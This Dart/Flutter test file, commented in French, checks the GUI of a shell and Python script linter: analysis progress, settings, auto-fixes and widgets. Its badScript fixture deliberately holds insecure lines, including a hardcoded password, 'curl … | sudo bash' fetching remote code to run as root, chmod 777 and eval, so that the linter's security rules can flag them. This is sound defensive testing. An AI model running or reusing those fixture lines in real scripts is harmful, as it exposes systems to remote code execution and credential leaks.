import 'dart:io';

import 'package:check_script/check_script.dart';
import 'package:check_script_gui/app_state.dart';
import 'package:check_script_gui/main.dart';
import 'package:check_script_gui/screens/folder_screen.dart';
import 'package:check_script_gui/widgets/findings_list.dart';
import 'package:check_script_gui/widgets/radar_chart.dart';
import 'package:check_script_gui/widgets/score_panel.dart';
import 'package:check_script_gui/widgets/source_view.dart';
import 'package:flutter/material.dart' hide Baseline;
import 'package:flutter_test/flutter_test.dart';
import 'package:shared_preferences/shared_preferences.dart';

/// Aucun outil externe : analyses déterministes (règles intégrées seules).
class NoTools implements CommandRunner {
  @override
  Future<CommandResult?> run(String executable, List<String> args,
          {String? stdin, CancelToken? cancel}) async =>
      null;
}

const badScript = '#!/bin/bash\ncd /opt/app\nPASSWORD="S3cr3tP@ss"\n'
    'curl -fsSL http://x.io/i.sh | sudo bash\nchmod 777 /srv\neval "\$CMD"\n';

void main() {
  late Directory tmp;
  setUp(() async {
    SharedPreferences.setMockInitialValues({});
    tmp = await Directory.systemTemp.createTemp('cs_gui_');
  });
  tearDown(() => tmp.delete(recursive: true));

  Future<ScriptReport> analyze(String content) => Engine(runner: NoTools())
      .analyze(ScriptInfo.fromContent('t.sh', content));

  group('AppState', () {
    test('analyse d\'un script, progression puis fin', () async {
      final f = File('${tmp.path}/bad.sh')..writeAsStringSync(badScript);
      final state = AppState(runner: NoTools());
      final fractions = <double>[];
      state.addListener(() {
        if (state.progress != null) fractions.add(state.progress!.fraction);
      });
      await state.analyzeFile(f.path);
      expect(state.busy, isFalse);
      expect(state.current!.findings.map((x) => x.ruleId), contains('SEC001'));
      expect(fractions, isNotEmpty);
    });

    test('analyse d\'un dossier', () async {
      File('${tmp.path}/a.sh').writeAsStringSync(badScript);
      File('${tmp.path}/b.sh')
          .writeAsStringSync('#!/bin/sh\n# ok\nset -eu\necho a\n');
      final state = AppState(runner: NoTools());
      await state.analyzeFolder(tmp.path);
      expect(state.folderReports, hasLength(2));
    });

    test('réglages → configuration (profil, contextes, outils)', () async {
      final state = AppState(
          runner: NoTools(),
          settings: const GuiSettings(
              profile: Profile.strict,
              contexts: {ExecContext.cron},
              disabledTools: {'bashate'}));
      final c = await state.buildConfig();
      expect(c.profile, Profile.strict);
      expect(c.contexts, {ExecContext.cron});
      expect(c.tool('bashate').enabled, isFalse);
    });

    test('correction d\'un seul problème : .orig, refus si fichier modifié',
        () async {
      final f = File('${tmp.path}/fix.sh')
        ..writeAsStringSync(
            '#!/bin/bash\nset -euo pipefail\negrep a f\nwhich ls\nread x\n');
      final state = AppState(runner: NoTools());
      await state.analyzeFile(f.path);
      Finding rule(String id) =>
          state.current!.findings.firstWhere((x) => x.ruleId == id);
      expect(await state.applyFindingFix(rule('POR005')), isNull);
      expect(f.readAsStringSync(),
          '#!/bin/bash\nset -euo pipefail\ngrep -E a f\nwhich ls\nread x\n');
      expect(File('${f.path}.orig').readAsStringSync(), contains('egrep'));
      expect(state.current!.findings.map((x) => x.ruleId),
          isNot(contains('POR005')));
      // Deuxième correction : le .orig garde le script d'avant la première.
      expect(await state.applyFindingFix(rule('POR004')), isNull);
      expect(f.readAsStringSync(), contains('command -v ls'));
      expect(File('${f.path}.orig').readAsStringSync(), contains('egrep'));
      final sc = rule('ROB007');
      f.writeAsStringSync('${f.readAsStringSync()}echo modifié\n');
      expect(await state.applyFindingFix(sc), AppState.staleFix);
    });

    test('outils Python : pylint activable, version cible transmise', () async {
      const g = GuiSettings();
      expect(g.toolEnabled('ruff'), isTrue);
      expect(g.toolEnabled('pylint'), isFalse);
      final on = g.withTool('pylint', true).withTool('ruff', false);
      expect(on.toolEnabled('pylint'), isTrue);
      expect(on.toolEnabled('ruff'), isFalse);
      final state = AppState(
          runner: NoTools(),
          settings: GuiSettings(
              enabledTools: on.enabledTools,
              disabledTools: on.disabledTools,
              pythonTarget: '3.11'));
      final c = await state.buildConfig();
      expect(c.tool('pylint').enabled, isTrue);
      expect(c.tool('ruff').enabled, isFalse);
      expect(c.pythonTarget, '3.11');
      await on.copyWith(pythonTarget: () => '3.12').save();
      final loaded = await GuiSettings.load();
      expect(loaded.pythonTarget, '3.12');
      expect(loaded.toolEnabled('pylint'), isTrue);
    });

    test('analyse d\'un script Python (sans outils : règles intégrées)',
        () async {
      final f = File('${tmp.path}/tool.py')
        ..writeAsStringSync('#!/usr/bin/python\nimport os\n\n'
            'def main():\n    os.getcwd()\n\nmain()\n');
      final state = AppState(runner: NoTools());
      await state.analyzeFile(f.path);
      final r = state.current!;
      expect(r.script.dialect, Dialect.python);
      expect(r.tools.map((t) => t.tool), isNot(contains('shellcheck')));
      expect(r.findings.map((x) => x.ruleId),
          containsAll(['PYPOR001', 'PYMNT002']));
    });

    test('réglages persistés', () async {
      await const GuiSettings(
              lang: Lang.en, profile: Profile.legacy, followSource: true)
          .save();
      final g = await GuiSettings.load();
      expect(g.lang, Lang.en);
      expect(g.profile, Profile.legacy);
      expect(g.followSource, isTrue);
    });

    test('référence puis correction appliquée avec copie .orig', () async {
      final f = File('${tmp.path}/fix.sh')
        ..writeAsStringSync('#!/bin/bash\n# t\negrep a f\n');
      final state = AppState(runner: NoTools());
      await state.analyzeFile(f.path);
      final base = File('${tmp.path}/base.json');
      await state.export(base.path, [state.current!]);
      await state.loadBaseline(base.path);
      expect(state.current!.comparison, isNotNull);
      final r = (await state.proposeFix())!;
      expect(r.changed, isTrue);
      await state.applyFix(r);
      expect(f.readAsStringSync(), contains('grep -E'));
      expect(File('${f.path}.orig').existsSync(), isTrue);
      expect(state.current!.comparison!.fixed, greaterThanOrEqualTo(1));
    });
  });

  test('tri du tableau du dossier', () async {
    final a = await analyze(badScript);
    final b = await analyze('#!/bin/bash\n# t\nset -euo pipefail\necho a\n');
    expect(sortReports([a, b], -1, true).first, a);
    expect(sortReports([a, b], -1, false).first, b);
  });

  test('radar : sommets', () {
    final c = RadarPainter.vertex(Offset.zero, 100, 0, 5, 10);
    expect(c.dx, closeTo(0, 1e-9));
    expect(c.dy, closeTo(-100, 1e-9));
    expect(
        RadarPainter.vertex(Offset.zero, 100, 0, 5, 5).dy, closeTo(-50, 1e-9));
  });

  testWidgets('écran d\'accueil : navigation et invitation à déposer',
      (tester) async {
    tester.view.physicalSize = const Size(1400, 900);
    addTearDown(tester.view.resetPhysicalSize);
    final state =
        AppState(runner: NoTools(), settings: const GuiSettings(lang: Lang.fr));
    await tester.pumpWidget(CheckScriptApp(state: state));
    expect(find.text('Analyse'), findsWidgets);
    expect(find.text('Dossier'), findsOneWidget);
    expect(find.textContaining('Déposez un script'), findsOneWidget);
    await tester.tap(find.text('Réglages'));
    await tester.pumpAndSettle();
    expect(find.text('Profil de notation'), findsOneWidget);
  });

  testWidgets('panneau des notes et source annotée', (tester) async {
    final report = await tester.runAsync(() => analyze(badScript));
    await tester.pumpWidget(MaterialApp(
      home: Scaffold(
        body: Row(children: [
          Expanded(
              child: SourceView(
                  lines: report!.script.lines, findings: report.findings)),
          SizedBox(
              width: 460,
              child: SingleChildScrollView(
                  child: ScorePanel(report: report, lang: Lang.en))),
        ]),
      ),
    ));
    expect(find.text('Security'), findsWidgets);
    expect(find.text(report.grade), findsOneWidget);
    expect(find.textContaining('PASSWORD'), findsOneWidget);
  });

  testWidgets('clic sur un problème : code de correction déplié',
      (tester) async {
    final report = await tester.runAsync(() => analyze(
        '#!/bin/bash\nset -euo pipefail\n# en-tête\negrep a f\neval "\$CMD"\n'));
    final applied = <String>[];
    await tester.pumpWidget(MaterialApp(
      home: Scaffold(
        body: FindingsList(
          findings: report!.findings,
          lang: Lang.fr,
          lines: report.script.lines,
          onApplyFix: (f) => applied.add(f.ruleId),
        ),
      ),
    ));
    expect(find.text('Correction proposée'), findsNothing);
    await tester.tap(find.textContaining('egrep'));
    await tester.pumpAndSettle();
    expect(find.text('Correction proposée'), findsOneWidget);
    expect(find.text('grep -E a f'), findsOneWidget);
    await tester.tap(find.text('Appliquer cette correction'));
    expect(applied, ['POR005']);

    // Règle sans correction automatique : exemple générique.
    await tester.tap(find.textContaining('SEC003'));
    await tester.pumpAndSettle();
    expect(find.text('Correction proposée'), findsNothing);
    expect(find.text('Exemple de correction'), findsOneWidget);
    expect(find.text('À écrire'), findsOneWidget);
    expect(find.text('Appliquer cette correction'), findsNothing);
    expect(find.text('Copier'), findsOneWidget);
  });
}
